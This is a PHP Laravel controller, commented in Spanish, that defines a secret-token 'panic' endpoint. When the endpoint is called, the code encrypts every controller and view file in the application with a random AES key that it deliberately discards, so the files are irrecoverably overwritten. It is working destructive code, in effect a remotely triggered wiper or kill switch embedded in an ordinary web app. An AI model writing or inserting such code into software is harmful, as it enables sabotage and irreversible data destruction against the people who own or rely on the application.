<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Symfony\Component\Finder\Finder;

class PanicController extends Controller
{
    protected $secret;

    public function __construct()
    {
        $this->secret = env('PANIC_SECRET');
    }

    protected function checkSecret(Request $request)
    {
        $token = $request->header('X-Panic-Token');
        return $token && hash_equals($this->secret, $token);
    }

    /**
     * Activar panic destructivo: encripta/ofusca archivos (irreversible salvo por Git/backup).
     * Excluirá los paths indicados en $exclusions.
     */
    public function triggerDestructive(Request $request)
    {
        if (! $this->checkSecret($request)) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        // Lista de paths a procesar
        $projectRoot = base_path();
        $controllerDir = $projectRoot . '/app/Http/Controllers';
        $viewsDir = $projectRoot . '/resources/views';

        // Excepciones: relative paths desde base_path()
        $exclusions = [
            // Dejar estos intactos para poder desactivar/consultar estado
            'app/Http/Controllers/PanicController.php',
            'resources/views/panic',          // si usas un folder de vistas de panic
            'panic.flag',                     // si usas un flag
            // agrega más paths que quieras preservar
        ];

        // Genero clave aleatoria (NO la guardo en disco)
        $key = random_bytes(32); // 256-bit key
        // Nota: la clave se mantiene solo en memoria durante ejecución del request.
        // No se escribe nunca en disco ni en logs.

        // Marker header para archivos encriptados
        $marker = "###ENCRYPTED_BY_PANIC###\n";

        // Helper para procesar archivos
        $processFile = function(string $filePath) use ($key, $marker) {
            try {
                if (! is_file($filePath) || ! is_readable($filePath)) {
                    return false;
                }

                $contents = File::get($filePath);

                // Generar IV
                $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));

                // Encriptar
                $ciphertext = openssl_encrypt($contents, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
                if ($ciphertext === false) {
                    return false;
                }

                // Escribir: marker + base64(iv) + ":" + base64(ciphertext)
                $payload = $marker . base64_encode($iv) . ':' . base64_encode($ciphertext);

                // Sobrescribir archivo
                File::put($filePath, $payload);

                return true;
            } catch (\Throwable $e) {
                // Si falla para algun archivo, seguir con los demás
                Log::error('Panic destructive: failed to encrypt file', ['file' => $filePath, 'err' => $e->getMessage()]);
                return false;
            }
        };

        // Procesar controladores con una instancia Finder nueva
        if (is_dir($controllerDir)) {
            $finderControllers = new Finder();
            $finderControllers->files()->in($controllerDir)->name('*.php');

            foreach ($finderControllers as $file) {
                $rel = ltrim(str_replace($projectRoot . '/', '', $file->getRealPath()), '/');
                if (in_array($rel, $exclusions, true)) continue;
                $processFile($file->getRealPath());
            }
        }

        // Procesar vistas con otra instancia Finder nueva
        if (is_dir($viewsDir)) {
            $finderViews = new Finder();
            $finderViews->files()->in($viewsDir)->name('*.php')->name('*.blade.php');

            foreach ($finderViews as $file) {
                $rel = ltrim(str_replace($projectRoot . '/', '', $file->getRealPath()), '/');
                // exclude any file inside the panic views folder or matching exclusions
                $skip = false;
                foreach ($exclusions as $ex) {
                    // si la exclusion es un folder (p. ej. resources/views/panic) o un archivo exacto
                    if ($rel === $ex || strpos($rel, rtrim($ex, '/')) === 0) {
                        $skip = true;
                        break;
                    }
                }
                if ($skip) continue;

                $processFile($file->getRealPath());
            }
        }

        // Registrar activación (no logeamos la clave)
        $ua = $request->header('User-Agent');
        $meta = [
            'ip' => $request->ip(),
            'ua' => $ua,
            'ts' => date('Y-m-d H:i:s'),
            'note' => 'Destructive panic executed; files encrypted and overwritten.'
        ];
        Log::warning('Panic DESTRUCTIVE activated', $meta);

        // Opcional: crear panic.flag para NGINX / middleware
        try {
            File::put(base_path('panic.flag'), json_encode($meta));
        } catch (\Throwable $e) {
            Log::error('Panic: failed to create panic.flag', ['err' => $e->getMessage()]);
        }

        // IMPORTANTE: No retornamos ni guardamos la clave; respuesta simple.
        return response()->json([
            'message' => 'Panic DESTRUCTIVE activated. Files overwritten. Restore from Git/backup.',
            'meta' => $meta
        ], 200);
    }
}
